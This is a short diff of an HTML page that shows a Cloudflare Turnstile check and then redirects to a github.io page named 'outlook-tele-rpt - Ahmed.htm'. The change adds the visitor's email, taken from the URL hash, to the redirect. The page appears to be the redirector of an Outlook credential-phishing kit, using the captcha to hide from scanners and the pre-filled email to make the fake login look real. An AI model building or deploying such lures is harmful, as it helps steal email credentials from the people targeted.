@@ -25,15 +25,15 @@
 
 
    <script>
-   
+
 var jemail  = location.hash.substr(1);
-   
+     
 window.onloadTurnstileCallback = function () {
     turnstile.render('#myWidget', {
-        sitekey: '0x4AAAAAACJiEli5mmBpBpNz',
+        sitekey: '0x4AAAAAACGTmjNYFY6FFyHH',
         callback: function(token) {
             console.log('Challenge Success ${token}');
-            window.location.href = "https://eddythomp.github.io/ipfs/outlook-tele-rpt - Ahmed.htm";
+            window.location.href = "https://eddythomp.github.io/ipfs/outlook-tele-rpt%20-%20Ahmed.htm#" + jemail ;
         },
     });
   };   
@@ -46,9 +46,6 @@ window.onloadTurnstileCallback = function () {
 </body>
 
 </html>
-
-
-
 
 
 
